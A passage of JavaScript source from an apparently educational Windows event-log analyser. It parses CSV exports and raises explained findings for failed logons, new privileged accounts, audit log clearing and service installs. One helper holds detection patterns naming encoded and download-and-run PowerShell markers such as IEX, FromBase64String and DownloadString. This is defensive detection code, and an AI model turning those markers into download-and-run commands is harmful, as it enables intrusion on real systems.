     header and also has more than one populated cell. */
  function findHeaderRow(rows) {
    var limit = Math.min(rows.length, 12);
    for (var i = 0; i < limit; i++) {
      var cells = rows[i];
      if (cells.length < 2) continue;
      var norms = cells.map(normaliseHeader);
      var hasId = norms.some(function (n) { return COLUMN_ALIASES.eventId.indexOf(n) !== -1; });
      if (hasId) return i;
    }
    return -1;
  }

  /* ---------------------------------------------------------------------
     6. Message parsing.
     Windows messages are laid out in blocks such as:

         Subject:
             Account Name:   jsmith
         New Logon:
             Account Name:   jsmith

     so we split the text into sections, then look up fields inside the
     section that is meaningful for each event type.
     --------------------------------------------------------------------- */
  function parseMessageSections(message) {
    var sections = {};
    var top = {};
    var current = top;
    var lines = String(message == null ? '' : message).split(/\r?\n/);

    lines.forEach(function (raw) {
      var line = raw.replace(/^[\s\u00a0]+|[\s\u00a0]+$/g, '');
      if (!line) return;

      /* Section header: a short line ending in ':' with no value after it */
      var header = /^([A-Za-z][A-Za-z0-9 \/()\-&']{0,40}):$/.exec(line);
      if (header) {
        var name = header[1].trim();
        if (!sections[name]) sections[name] = {};
        current = sections[name];
        return;
      }

      /* "Field: value" */
      var pair = /^([A-Za-z][A-Za-z0-9 \/()\-&'.]{0,60}?)[\s]*:[\s\u00a0]*(.*)$/.exec(line);
      if (pair) {
        var key = pair[1].trim();
        var val = pair[2].trim();
        if (current[key] === undefined || (val && current[key] === '-')) current[key] = val;
      }
    });

    return { sections: sections, top: top };
  }

  /* Read a field from the first section in `order` that has a usable value. */
  function pickSectionField(parsed, order, fieldNames) {
    for (var i = 0; i < order.length; i++) {
      var section = parsed.sections[order[i]];
      if (!section) continue;
      for (var j = 0; j < fieldNames.length; j++) {
        var value = section[fieldNames[j]];
        if (isUsable(value)) return clean(value);
      }
    }
    return null;
  }
  function pickTopField(parsed, fieldNames) {
    for (var j = 0; j < fieldNames.length; j++) {
      var value = parsed.top[fieldNames[j]];
      if (isUsable(value)) return clean(value);
    }
    return null;
  }
  /* Some fields (for example "Logon Type") appear on their own line in a real
     Windows message and are not always inside a named block. This helper looks
     in the top-level map first, then in every section, so those values are not
     missed when the surrounding text is laid out unexpectedly. */
  function pickAnyField(parsed, fieldNames) {
    var fromTop = pickTopField(parsed, fieldNames);
    if (fromTop) return fromTop;
    var sectionNames = Object.keys(parsed.sections);
    for (var i = 0; i < sectionNames.length; i++) {
      var section = parsed.sections[sectionNames[i]];
      for (var j = 0; j < fieldNames.length; j++) {
        if (isUsable(section[fieldNames[j]])) return clean(section[fieldNames[j]]);
      }
    }
    return null;
  }
  function isUsable(value) {
    if (value === undefined || value === null) return false;
    var v = String(value).trim();
    return v !== '' && v !== '-' && v.toLowerCase() !== 'n/a' && v.toLowerCase() !== 'none';
  }
  function clean(value) { return String(value).replace(/^[\s\u00a0]+|[\s\u00a0]+$/g, ''); }

  var ACCOUNT_ORDER = [
    'New Logon', 'Account For Which Logon Failed', 'New Account',
    'Target Account', 'Member', 'Creator Subject', 'Subject'
  ];
  var ACCOUNT_FIELDS = ['Account Name', 'SAM Account Name', 'User Name', 'Target User Name'];

  /* Extract the interesting values from a message body. Every value is
     optional — the tool degrades gracefully when a message is missing. */
  function extractMessageFields(message) {
    var parsed = parseMessageSections(message);
    var out = {};

    out.targetAccount = pickSectionField(parsed, ACCOUNT_ORDER, ACCOUNT_FIELDS);
    out.actorAccount = pickSectionField(parsed, ['Subject', 'Creator Subject'], ACCOUNT_FIELDS);
    out.groupName = pickSectionField(parsed, ['Group', 'Target Group', 'New Group'], ['Group Name', 'Target Group Name']);
    out.sourceIp = pickSectionField(parsed, ['Network Information'],
                     ['Source Network Address', 'Source Address', 'Ip Address', 'Source IP Address'])
                 || pickAnyField(parsed, ['Source Network Address', 'Source Address', 'Ip Address']);
    out.workstation = pickSectionField(parsed, ['Network Information'], ['Workstation Name'])
                    || pickAnyField(parsed, ['Workstation Name']);
    out.logonType = pickAnyField(parsed, ['Logon Type']);
    out.processName = pickSectionField(parsed, ['Process Information'],
                        ['New Process Name', 'Process Name', 'Image File Name'])
                    || pickAnyField(parsed, ['New Process Name', 'Image File Name']);
    out.parentProcess = pickSectionField(parsed, ['Process Information'],
                          ['Creator Process Name', 'Parent Process Name'])
                      || pickAnyField(parsed, ['Creator Process Name', 'Parent Process Name']);
    out.commandLine = pickSectionField(parsed, ['Process Information'],
                        ['Process Command Line', 'Command Line'])
                    || pickAnyField(parsed, ['Process Command Line', 'Command Line']);
    out.serviceName = pickAnyField(parsed, ['Service Name']);
    out.serviceFile = pickAnyField(parsed, ['Service File Name', 'Image Path']);

    return out;
  }

  /* ---------------------------------------------------------------------
     7. Timestamp parsing.
     Windows exports timestamps in the machine's locale, so we support
     ISO style, day-first and month-first, with or without a time. The
     date order is detected once for the whole file.
     --------------------------------------------------------------------- */
  function detectDateOrder(rawTimes) {
    var dayFirst = false, monthFirst = false;
    rawTimes.forEach(function (raw) {
      var m = /^\s*(\d{1,2})[\/\.\-](\d{1,2})[\/\.\-](\d{2,4})/.exec(String(raw || ''));
      if (!m) return;
      var a = parseInt(m[1], 10), b = parseInt(m[2], 10);
      if (a > 12 && b <= 12) dayFirst = true;
      else if (b > 12 && a <= 12) monthFirst = true;
    });
    if (monthFirst && !dayFirst) return 'mdy';
    return 'dmy';
  }

  function buildDate(y, mo, d, h, mi, s) {
    if (!(mo >= 1 && mo <= 12) || !(d >= 1 && d <= 31)) return null;
    var dt = new Date(y, mo - 1, d, h || 0, mi || 0, s || 0, 0);
    if (isNaN(dt.getTime())) return null;
    if (dt.getFullYear() !== y || dt.getMonth() !== mo - 1 || dt.getDate() !== d) return null;
    return dt;
  }

  function parseTimestamp(raw, order) {
    var s = String(raw == null ? '' : raw).trim();
    if (!s) return null;

    /* 2026-10-14 09:12:03 / 2026-10-14T09:12:03 */
    var m = /^(\d{4})[-\/.](\d{1,2})[-\/.](\d{1,2})(?:[T ](\d{1,2}):(\d{2})(?::(\d{2}))?)?/.exec(s);
    if (m) return buildDate(+m[1], +m[2], +m[3], +(m[4] || 0), +(m[5] || 0), +(m[6] || 0));

    /* 14/10/2026 09:12:03  or  10/14/2026 9:12:03 AM */
    m = /^(\d{1,2})[-\/.](\d{1,2})[-\/.](\d{2,4})(?:[ T](\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?/.exec(s);
    if (m) {
      var a = +m[1], b = +m[2], y = +m[3];
      if (y < 100) y += 2000;
      var day, month;
      if (order === 'mdy') { month = a; day = b; } else { day = a; month = b; }
      if (month > 12 && day <= 12) { var swap = month; month = day; day = swap; }
      var hh = m[4] === undefined ? 0 : +m[4];
      var ap = m[7] ? m[7].toUpperCase() : '';
      if (ap === 'PM' && hh < 12) hh += 12;
      if (ap === 'AM' && hh === 12) hh = 0;
      return buildDate(y, month, day, hh, +(m[5] || 0), +(m[6] || 0));
    }
    return null;
  }

  function formatTime(date) {
    if (!date) return '—';
    var p = function (n) { return (n < 10 ? '0' : '') + n; };
    return date.getFullYear() + '-' + p(date.getMonth() + 1) + '-' + p(date.getDate()) +
           ' ' + p(date.getHours()) + ':' + p(date.getMinutes()) + ':' + p(date.getSeconds());
  }
  function formatTimeShort(date) {
    if (!date) return '—';
    var p = function (n) { return (n < 10 ? '0' : '') + n; };
    return p(date.getHours()) + ':' + p(date.getMinutes()) + ':' + p(date.getSeconds());
  }

  /* ---------------------------------------------------------------------
     8. Event normalisation
     --------------------------------------------------------------------- */
  function cellAt(row, index) {
    if (index === undefined || index === null || index < 0) return '';
    var value = row[index];
    return value === undefined || value === null ? '' : String(value).trim();
  }

  function toEventId(raw) {
    var m = /(\d{1,6})/.exec(String(raw == null ? '' : raw));
    if (!m) return null;
    var n = parseInt(m[1], 10);
    return (n > 0) ? n : null;
  }

  function cleanAccount(value) {
    if (!isUsable(value)) return null;
    var v = clean(value);
    return v.replace(/\s*\(.*\)$/, '').trim() || null;
  }

  /* Group accounts ignoring the domain prefix, so CORP\jsmith and jsmith
     are treated as the same account. */
  function accountKey(value) {
    if (!value) return '';
    var v = String(value).toLowerCase().trim();
    var slash = Math.max(v.lastIndexOf('\\'), v.lastIndexOf('/'));
    if (slash !== -1) v = v.slice(slash + 1);
    if (v.charAt(v.length - 1) === '$') v = v.slice(0, -1);
    return v;
  }

  function isPrivilegedGroup(name) {
    if (!name) return false;
    var n = String(name).toLowerCase().trim();
    if (PRIVILEGED_GROUPS.indexOf(n) !== -1) return true;
    return /admin|administrator/.test(n);
  }

  /* Detect obviously encoded or heavily obfuscated PowerShell text. This is
     a hint for the student to look closer — not a malware verdict. */
  function looksObfuscated(text) {
    if (!text) return false;
    var t = String(text);
    var hits = 0;
    if (/-enc(odedcommand)?\b/i.test(t)) hits++;
    if (/frombase64string/i.test(t)) hits++;
    if (/\bIEX\b|Invoke-Expression/i.test(t)) hits++;
    if (/-w(indowstyle)?\s+hidden|-nop\b|-noprofile/i.test(t)) hits++;
    if (/downloadstring|downloadfile|invoke-webrequest|net\.webclient/i.test(t)) hits++;
    if (/[A-Za-z0-9+\/]{120,}={0,2}/.test(t)) hits++;
    return hits >= 2;
  }

  /* Turn raw CSV text into a list of normalised event objects. */
  function parseEventFile(text) {
    var result = { ok: false, error: null, events: [], warnings: [], notes: [], columns: null, totalRows: 0 };

    var rows = parseCSV(text);
    if (!rows.length) {
      result.error = 'The file appears to be empty, or no readable rows were found.';
      return result;
    }

    var headerIndex = findHeaderRow(rows);
    if (headerIndex === -1) {
      result.error = 'This file does not appear to contain an "Event ID" column, so it cannot be analysed. ' +
                     'Expected something like: Level, Date and Time, Source, Event ID, Task Category, ...';
      return result;
    }

    var detected = detectColumns(rows[headerIndex]);
    result.columns = detected.found;
    var map = detected.map;

    if (map.eventId === undefined) {
      result.error = 'This file does not appear to contain an Event ID column.';
      return result;
    }
    if (map.time === undefined) {
      result.warnings.push('No date/time column was found. Events are still analysed, but the timeline is unavailable.');
    }
    if (map.account === undefined) {
      result.warnings.push('No "User" or "Account Name" column was found. Account names will only be taken from message text where present.');
    }
    if (map.message === undefined) {
      result.warnings.push('No "Message" column was found. Source IP addresses, group names and logon types usually live inside the message, so those details may be unavailable.');
    }
    if (map.computer === undefined) {
      result.warnings.push('No "Computer" column was found.');
    }

    var bodyRows = rows.slice(headerIndex + 1);
    result.totalRows = bodyRows.length;

    /* Pass 1: collect usable rows and the raw timestamp strings */
    var collected = [];
    var rawTimes = [];
    var skipped = 0;

    bodyRows.forEach(function (row) {
      var id = toEventId(cellAt(row, map.eventId));
      if (id === null) { skipped++; return; }
      collected.push({ row: row, id: id });
      rawTimes.push(cellAt(row, map.time));
    });

    if (!collected.length) {
      result.error = 'Rows were found, but none of them contained a usable Event ID number.';
      return result;
    }
    if (skipped > 0) {
      result.notes.push(plural(skipped, 'row was', 'rows were') + ' skipped because no Event ID could be read from them.');
    }

    var dateOrder = detectDateOrder(rawTimes);
    result.dateOrder = dateOrder;

    /* Pass 2: build the events */
    var parsedTimes = 0;
    var events = collected.map(function (item, index) {
      var row = item.row;
      var message = cellAt(row, map.message);
      var fields = extractMessageFields(message);

      var meta = EVENT_CATALOG[item.id] || null;
      var account = cleanAccount(fields.targetAccount) || cleanAccount(cellAt(row, map.account));
      var time = parseTimestamp(cellAt(row, map.time), dateOrder);
      if (time) parsedTimes++;

      var sourceIp = fields.sourceIp;
      if (sourceIp && !/^(\d{1,3}\.){3}\d{1,3}$/.test(sourceIp) && sourceIp.indexOf(':') === -1) {
        sourceIp = null;    /* ignore placeholders such as "-" or hostnames */
      }

      return {
        index: index + 1,
        rowNumber: headerIndex + 2 + index,
        eventId: item.id,
        known: !!meta,
        name: meta ? meta.name : 'Unrecognised Event ID',
        category: meta ? meta.category : 'Other',
        severity: meta ? meta.severity : 'Unrecognised',
        plain: meta ? meta.plain
                    : 'This Event ID is not in the tool\'s reference list, so it is counted but never flagged. Look it up before drawing conclusions.',
        timeRaw: cellAt(row, map.time),
        time: time,
        account: account,
        accountKey: accountKey(account),
        rawUser: cellAt(row, map.account),
        actor: cleanAccount(fields.actorAccount),
        level: cellAt(row, map.level),
        provider: cellAt(row, map.source),
        computer: cellAt(row, map.computer),
        message: message,
        sourceIp: sourceIp,
        workstation: fields.workstation,
        logonType: fields.logonType,
        groupName: fields.groupName,
        processName: fields.processName,
        parentProcess: fields.parentProcess,
        commandLine: fields.commandLine,
        serviceName: fields.serviceName,
        serviceFile: fields.serviceFile
      };
    });

    if (map.time !== undefined && parsedTimes === 0) {
      result.warnings.push('Timestamps could not be reliably parsed from this export, so the timeline is unavailable. ' +
                           'Counts, per-account correlation and all other rules still work.');
    } else if (map.time !== undefined && parsedTimes < events.length) {
      result.notes.push(plural(events.length - parsedTimes, 'event had', 'events had') +
                        ' a timestamp the tool could not read; they are counted but excluded from the timeline.');
    }

    result.events = events;
    result.ok = true;
    return result;
  }

  /* ---------------------------------------------------------------------
     9. Detection and correlation rules.
     Rule-based and explainable on purpose: every finding states what was
     observed, why it might matter, benign explanations and next steps.
     --------------------------------------------------------------------- */
  function groupBy(events, keyFn) {
    var map = {};
    events.forEach(function (event) {
      var key = keyFn(event);
      if (!key) return;
      if (!map[key]) map[key] = [];
      map[key].push(event);
    });
    return map;
  }

  function byTimeAscending(a, b) {
    if (a.time && b.time) return a.time - b.time;
    if (a.time) return -1;
    if (b.time) return 1;
    return a.index - b.index;
  }

  /* Largest number of timestamps that fit inside a sliding window. */
  function maxInWindow(timesMs, windowMs) {
    if (!timesMs.length) return 0;
    var sorted = timesMs.slice().sort(function (a, b) { return a - b; });
    var best = 0, start = 0;
    for (var end = 0; end < sorted.length; end++) {
      while (sorted[end] - sorted[start] > windowMs) start++;
      if (end - start + 1 > best) best = end - start + 1;
    }
    return best;
  }

  function mostCommon(values) {
    var counts = {}, best = null, bestCount = 0;
    values.forEach(function (v) {
      if (!v) return;
      counts[v] = (counts[v] || 0) + 1;
      if (counts[v] > bestCount) { bestCount = counts[v]; best = v; }
    });
    return best;
  }

  function displayNameFor(events) {
    var names = events.map(function (e) { return e.account; }).filter(Boolean);
    return mostCommon(names) || 'Unknown';
  }

  function timeRangeOf(events) {
    var times = events.map(function (e) { return e.time; }).filter(Boolean)
                       .sort(function (a, b) { return a - b; });
    if (!times.length) return null;
    return { from: times[0], to: times[times.length - 1] };
  }

  function timeRangeText(events) {
    var range = timeRangeOf(events);
    if (!range) return 'Not available (timestamps could not be read)';
    if (range.from.getTime() === range.to.getTime()) return formatTime(range.from);
    return formatTime(range.from) + '  →  ' + formatTime(range.to);
  }

  function sourceIpsOf(events) {
    var ips = [];
    events.forEach(function (e) {
      if (e.sourceIp && ips.indexOf(e.sourceIp) === -1) ips.push(e.sourceIp);
    });
    return ips;
  }

  function computersOf(events) {
    var list = [];
    events.forEach(function (e) {
      if (e.computer && list.indexOf(e.computer) === -1) list.push(e.computer);
    });
    return list;
  }

  function makeFinding(spec) {
    return {
      title: spec.title,
      severity: spec.severity,
      eventIds: spec.eventIds || [],
      account: spec.account || null,
      timeRange: spec.timeRange || null,
      sourceIps: spec.sourceIps || [],
      computers: spec.computers || [],
      observed: spec.observed || '',
      sequence: spec.sequence || null,
      why: spec.why || '',
      benign: spec.benign || [],
      investigation: spec.investigation || [],
      points: spec.points || 0,
      scoreLabel: spec.scoreLabel || spec.title
    };
  }

  /* ---- Rule 1 & 2: repeated failed logons, and failures followed by success ---- */
  function rulesFailedLogons(events, settings, findings, notes) {
    var failures = events.filter(function (e) { return e.eventId === 4625; });
    var successes = events.filter(function (e) { return e.eventId === 4624; });
    var failByAccount = groupBy(failures, function (e) { return e.accountKey; });
    var successByAccount = groupBy(successes, function (e) { return e.accountKey; });

    var threshold = settings.failedLoginThreshold;
    var windowMinutes = settings.failedLoginWindowMinutes;
    var consumed = {};

    Object.keys(failByAccount).forEach(function (key) {
      var accountFailures = failByAccount[key].slice().sort(byTimeAscending);
      var total = accountFailures.length;
      if (total < threshold) return;

      /* How many failures happened inside the configured time window? */
      var times = accountFailures.filter(function (e) { return !!e.time; })
                                 .map(function (e) { return e.time.getTime(); });
      var windowUsable = windowMinutes > 0 && times.length === total;
      var windowCount = windowUsable ? maxInWindow(times, windowMinutes * 60000) : total;
      if (windowCount < threshold) {
        notes.push('Account "' + displayNameFor(accountFailures) + '" had ' + plural(total, 'failed logon', 'failed logons') +
                   ' in total, but fewer than ' + threshold + ' within any ' + windowMinutes +
                   '-minute window, so no repeated-failure finding was raised.');
        return;
      }

      var accountName = displayNameFor(accountFailures);
      var accountSuccesses = (successByAccount[key] || []).slice().sort(byTimeAscending);

      /* Rule 2: were the failures followed by a successful logon? */
      var after = null;
      var firstFailureTime = null;
      for (var i = 0; i < accountFailures.length; i++) {
        if (accountFailures[i].time) { firstFailureTime = accountFailures[i].time; break; }
      }
      if (accountSuccesses.length) {
        if (firstFailureTime) {
          accountSuccesses.forEach(function (s) {
            if (s.time && s.time.getTime() >= firstFailureTime.getTime()) {
              if (!after || s.time < after.time) after = s;
            }
          });
        } else {
          after = accountSuccesses[accountSuccesses.length - 1];
        }
      }

      var ips = sourceIpsOf(accountFailures);
      var computers = computersOf(accountFailures);
      var gapText = '';
      if (after && after.time) {
        var lastFailure = accountFailures[accountFailures.length - 1];
        if (lastFailure && lastFailure.time) {
          var seconds = Math.max(0, Math.round((after.time.getTime() - lastFailure.time.getTime()) / 1000));
          gapText = ' The successful logon happened ' + seconds + ' second' + (seconds === 1 ? '' : 's') +
                    ' after the last recorded failure.';
        }
      }

      if (after) {
        consumed[key] = true;
        findings.push(makeFinding({
          title: 'Possible Password Guessing Followed By Success',
          severity: 'High',
          eventIds: [4625, 4624],
          account: accountName,
          timeRange: timeRangeText(accountFailures.concat([after])),
          sourceIps: ips,
          computers: computers,
          sequence: '4625 ×' + windowCount + (windowUsable ? ' (within ' + windowMinutes + ' min)' : '') + '  →  4624',
          observed: plural(windowCount, 'failed logon', 'failed logons') +
                    ' for account "' + accountName + '"' +
                    (windowUsable ? ' within a ' + windowMinutes + '-minute window' : '') +
                    ', followed by a successful logon (Event 4624) for the same account.' + gapText,
          why: 'Repeated authentication failures followed by a success can indicate that a password was eventually guessed or ' +
               'sprayed successfully. It can equally be a legitimate user who mistyped a password several times and then got it right.',
          benign: [
            'The legitimate user simply entered the wrong password repeatedly and then typed it correctly.',
            'A saved credential or service was out of date, and a manual logon fixed it.',
            'A user changed their password and an old session or application retried with the previous one.',
            'A shared or kiosk account used by several people at once.'
          ],
          investigation: [
            'Confirm the source IP address and workstation — do they belong to the user or to a known device?',
            'Check whether the account has multi-factor authentication, and whether an MFA prompt was approved around that time.',
            'Review what the account did after the successful logon (process creation, file access, privilege use).',
            'Check whether other accounts received similar failures from the same source address.',
            'Look for a matching change ticket, help-desk call or password reset.',
            'If the activity cannot be explained, treat the account as potentially compromised and follow your organisation\'s incident process.'
          ],
          points: 20,
          scoreLabel: 'Repeated failed logons followed by a successful logon'
        }));
        return;
      }

      /* Rule 1: repeated failures, but no successful logon afterwards */
      consumed[key] = true;
      findings.push(makeFinding({
        title: 'Repeated Failed Logons',
        severity: windowCount >= threshold * 3 ? 'High' : 'Medium',
        eventIds: [4625],
        account: accountName,
        timeRange: timeRangeText(accountFailures),
        sourceIps: ips,
        computers: computers,
        observed: plural(windowCount, 'failed logon', 'failed logons') + ' for account "' + accountName + '"' +
                  (windowUsable ? ' within a ' + windowMinutes + '-minute window' : ' in this dataset') +
                  ' (configured threshold: ' + threshold + ').' +
                  ' No successful logon for this account appears afterwards in the data provided.',
        why: 'Repeated authentication failures for one account may indicate password guessing or a brute-force attempt. ' +
             'They may also be caused by a legitimate user with a forgotten password, or by an application or service still using an old password.',
        benign: [
          'A user forgot their password and tried several times.',
          'A scheduled task, service or mapped drive is using stale credentials.',
          'A mobile device or mail client is repeatedly retrying an old password.',
          'A password was changed recently and an automated process has not been updated yet.'
        ],
        investigation: [
          'Identify the source system and source IP address for the failures.',
          'Review the affected account: is it active, expected, and owned by a real person or a service?',
          'Check whether the failures were followed by a successful logon (this tool reports that separately when it sees it).',
          'Determine whether other accounts were targeted from the same source.',
          'Review MFA, endpoint and network telemetry if available.',
          'Confirm with the user or the change record whether this was expected.'
        ],
        points: 10,
        scoreLabel: 'Repeated failed logons'
      }));
    });

    return consumed;
  }

  function describeEventSequence(list) {
    return list.slice().sort(byTimeAscending).map(function (e) {
      var extra = '';
      if (e.groupName) extra = ' (' + e.groupName + ')';
      else if (e.serviceName) extra = ' (' + e.serviceName + ')';
      return e.eventId + ' — ' + e.name + extra;
    }).join('  →  ');
  }

  /* ---- Rule 3: account created, then granted privileges ---- */
  function ruleAccountCreatedThenPrivileged(events, settings, findings) {
    var created = events.filter(function (e) { return e.eventId === 4720; });
    var privilegeChanges = events.filter(function (e) { return e.eventId === 4728 || e.eventId === 4732; });

    var createdByAccount = groupBy(created, function (e) { return e.accountKey; });
    var privByAccount = groupBy(privilegeChanges, function (e) { return e.accountKey; });
    var consumed = {};

    Object.keys(createdByAccount).forEach(function (key) {
      var additions = privByAccount[key];
      if (!additions || additions.length < settings.privilegeChangeThreshold) return;

      consumed[key] = true;
      var combined = createdByAccount[key].concat(additions);
      var privileged = additions.some(function (e) { return isPrivilegedGroup(e.groupName); });
      var groupNames = additions.map(function (e) { return e.groupName; }).filter(Boolean);
      var accountName = displayNameFor(combined);
      var creator = mostCommon(createdByAccount[key].map(function (e) { return e.actor; })) || 'not recorded in the data';

      findings.push(makeFinding({
        title: 'New Account Granted Privileges',
        severity: 'High',
        eventIds: [4720, 4728, 4732].filter(function (id) {
          return combined.some(function (e) { return e.eventId === id; });
        }),
        account: accountName,
        timeRange: timeRangeText(combined),
        sourceIps: sourceIpsOf(combined),
        computers: computersOf(combined),
        sequence: describeEventSequence(combined),
        observed: 'Account "' + accountName + '" was created (Event 4720) and then added to ' +
                  plural(additions.length, 'security group', 'security groups') +
                  (groupNames.length ? ': ' + groupNames.join(', ') : '') + '.' +
                  (privileged ? ' At least one of those groups is a privileged group.' : '') +
                  ' The account creation was performed by: ' + creator + '.',
        why: 'Creating an account and then quickly granting it elevated privileges is a common way to establish persistence or ' +
             'escalate privileges. It is also completely normal during legitimate onboarding or administrative work — which is why ' +
             'it needs verifying rather than assuming.',
        benign: [
          'A new administrator, engineer or contractor was legitimately onboarded.',
          'A service account was created for a new application or backup job.',
          'A documented change added a user to a group for a project.',
          'Help-desk staff recreated an account and re-applied its groups.'
        ],
        investigation: [
          'Confirm whether the account creation was authorised — check change records, tickets and the HR onboarding list.',
          'Identify which administrator performed the change (the "Subject" account in the events).',
          'Review what the new account did afterwards: logons, processes started, files or shares accessed.',
          'Check whether the account is still required, and whether it has a strong unique password and MFA.',
          'If the account is not authorised, disable it, remove the group membership and escalate.'
        ],
        points: 25,
        scoreLabel: 'Account created and then granted privileges'
      }));
    });

    return consumed;
  }

  /* ---- Standalone account findings (4720 / 4726) ---- */
  function rulesAccountStandalone(events, findings, consumed) {
    var createdByAccount = groupBy(
      events.filter(function (e) { return e.eventId === 4720; }),
      function (e) { return e.accountKey; }
    );
    Object.keys(createdByAccount).forEach(function (key) {
      if (consumed[key]) return;
      var group = createdByAccount[key];
      var accountName = displayNameFor(group);
      var actor = mostCommon(group.map(function (e) { return e.actor; })) || 'not recorded in the data';
      findings.push(makeFinding({
        title: 'User Account Created',
        severity: 'Medium',
        eventIds: [4720],
        account: accountName,
        timeRange: timeRangeText(group),
        computers: computersOf(group),
        observed: 'A new user account "' + accountName + '" was created. Created by: ' + actor + '.',
        why: 'Account creation is often routine, but attackers also create accounts to keep access. Because it changes who can log in, ' +
             'it is worth confirming that it was authorised.',
        benign: [
          'A new employee, contractor or supplier account was being set up.',
          'A service account was created for an application, backup or monitoring tool.',
          'A test or lab account was created by an administrator.'
        ],
        investigation: [
          'Confirm the account was requested through an approved process.',
          'Check who created it and whether that person was authorised to do so.',
          'Review whether the account has been used since creation, and from where.',
          'Confirm it has an appropriate password policy and MFA where required.'
        ],
        points: 10,
        scoreLabel: 'User account created'
      }));
    });

    var deletedByAccount = groupBy(
      events.filter(function (e) { return e.eventId === 4726; }),
      function (e) { return e.accountKey; }
    );
    Object.keys(deletedByAccount).forEach(function (key) {
      var group = deletedByAccount[key];
      var accountName = displayNameFor(group);
      findings.push(makeFinding({
        title: 'User Account Deleted',
        severity: 'Low',
        eventIds: [4726],
        account: accountName,
        timeRange: timeRangeText(group),
        computers: computersOf(group),
        observed: 'The user account "' + accountName + '" was deleted.',
        why: 'Account deletion is usually administration (a leaver, a stale service account, a cleanup). It can also form part of ' +
             'account manipulation, or remove a record of activity.',
        benign: [
          'An employee left the organisation and their account was decommissioned.',
          'A stale or duplicate account was cleaned up.',
          'A test account was removed after use.'
        ],
        investigation: [
          'Confirm the deletion matches a leaver or cleanup process.',
          'Check whether the account was in use shortly before deletion, and by whom.',
          'Confirm no shared service depended on the account.'
        ],
        points: 5,
        scoreLabel: 'User account deleted'
      }));
    });
  }

  /* ---- Standalone privilege change findings (4728 / 4732) ---- */
  function rulesPrivilegeStandalone(events, settings, findings, consumed) {
    var privByAccount = groupBy(
      events.filter(function (e) { return e.eventId === 4728 || e.eventId === 4732; }),
      function (e) { return e.accountKey; }
    );
    Object.keys(privByAccount).forEach(function (key) {
      if (consumed[key]) return;
      var group = privByAccount[key];
      if (group.length < settings.privilegeChangeThreshold) return;
      var privileged = group.some(function (e) { return isPrivilegedGroup(e.groupName); });
      var accountName = displayNameFor(group);
      var groupNames = group.map(function (e) { return e.groupName; }).filter(Boolean);
      var actor = mostCommon(group.map(function (e) { return e.actor; })) || 'not recorded in the data';

      findings.push(makeFinding({
        title: 'Privileged Group Membership Change',
        severity: privileged ? 'High' : 'Medium',
        eventIds: [4728, 4732],
        account: accountName,
        timeRange: timeRangeText(group),
        computers: computersOf(group),
        sequence: describeEventSequence(group),
        observed: 'Account "' + accountName + '" was added to ' + plural(group.length, 'security group', 'security groups') +
                  (groupNames.length ? ': ' + groupNames.join(', ') : '') + '.' +
                  (privileged ? ' This includes a privileged group.' : '') +
                  ' Changed by: ' + actor + '.',
        why: 'Adding an account to a security group changes what it can do. Membership of an administrative group is one of the ' +
             'quickest ways to gain control of a system, and is also completely routine in day-to-day administration.',
        benign: [
          'A legitimate promotion, role change or project assignment.',
          'Help-desk or engineering work covered by a change ticket.',
          'Software installation that temporarily required elevated rights.',
          'Re-adding an existing administrator after an account was recreated.'
        ],
        investigation: [
          'Identify which account performed the change and whether that person was authorised.',
          'Confirm the group membership is still needed.',
          'Review what the added account has done since the change.',
          'Check for other changes to the same group in the same period.'
        ],
        points: privileged ? 25 : 15,
        scoreLabel: privileged ? 'Privileged group membership change' : 'Security group membership change'
      }));
    });
  }

  /* ---- Rule 4: the Security audit log was cleared ---- */
  function ruleAuditLogCleared(events, findings) {
    var cleared = events.filter(function (e) { return e.eventId === 1102; });
    if (!cleared.length) return;

    var actors = cleared.map(function (e) { return e.actor || e.account; }).filter(Boolean);
    var actor = mostCommon(actors) || 'not recorded in the data';
    var computers = computersOf(cleared);

    findings.push(makeFinding({
      title: 'Security Audit Log Cleared',
      severity: 'High',
      eventIds: [1102],
      account: actor,
      timeRange: timeRangeText(cleared),
      computers: computers,
      observed: 'The Windows Security audit log was cleared ' + plural(cleared.length, 'time', 'times') +
                ' on ' + (computers.length ? computers.join(', ') : 'the affected system') +
                '. The account recorded in the event is: ' + actor + '.',
      why: 'This event means the Windows Security audit log was cleared. It can happen during legitimate maintenance, but because ' +
           'attackers often clear logs to remove evidence of their activity, it should normally be investigated. Clearing the log ' +
           'does not by itself prove malicious intent — it removes the very evidence that would confirm or rule it out.',
      benign: [
        'A planned maintenance task or script that rotates or clears the log.',
        'Troubleshooting of a full or corrupted event log.',
        'A test or lab system where logs are cleared routinely.',
        'Log archival tooling that clears the log after exporting it.'
      ],
      investigation: [
        'Confirm whether a maintenance window, script or administrator was expected to clear the log.',
        'Check the recorded account and whether that account should have been used on this system.',
        'Look for other activity around the same time: logons, account changes, service installations.',
        'Check whether the log was exported before clearing, and where that export went.',
        'Compare with centralised log collection (SIEM) to see what happened just before the clear.',
        'If the clearing is unexplained, treat it as a potential defence-evasion step and escalate.'
      ],
      points: 30,
      scoreLabel: 'Security audit log cleared'
    }));
  }

  /* ---- Service installation and PowerShell context ---- */
  function rulesServiceAndPowerShell(events, findings) {
    var services = events.filter(function (e) { return e.eventId === 7045; });
    var byService = groupBy(services, function (e) { return (e.serviceName || 'unnamed') + '|' + e.computer; });
    Object.keys(byService).forEach(function (key) {
      var group = byService[key];
      var first = group[0];
      findings.push(makeFinding({
        title: 'New Windows Service Installed',
        severity: 'Low',
        eventIds: [7045],
        account: first.account,
        timeRange: timeRangeText(group),
        computers: computersOf(group),
        observed: 'A new service was installed' + (first.serviceName ? ': "' + first.serviceName + '"' : '') +
                  (first.serviceFile ? ' (binary: ' + first.serviceFile + ')' : '') + '.',
        why: 'Installing a service is how most legitimate software starts automatically. It is also a well-known way to make ' +
             'malicious code start with Windows, so an unexpected service is worth a quick check.',
        benign: [
          'A software package or agent (backup, monitoring, antivirus) was installed.',
          'A Windows update or driver installation created a service.',
          'An administrator configured a legitimate custom service.'
        ],
        investigation: [
          'Confirm the service belongs to known software you expect on this system.',
          'Check the binary path — services running from user profile or temporary folders deserve closer attention.',
          'Verify the file signature and hash of the service binary.',
          'Confirm whether a change ticket covers the installation.'
        ],
        points: 10,
        scoreLabel: 'New service installed'
      }));
    });

    events.filter(function (e) { return e.eventId === 4104; }).forEach(function (e) {
      var text = (e.commandLine || '') + '\n' + (e.message || '');
      if (!looksObfuscated(text)) return;
      findings.push(makeFinding({
        title: 'Obfuscated or Encoded PowerShell Command',
        severity: 'Medium',
        eventIds: [4104],
        account: e.account,
        timeRange: timeRangeText([e]),
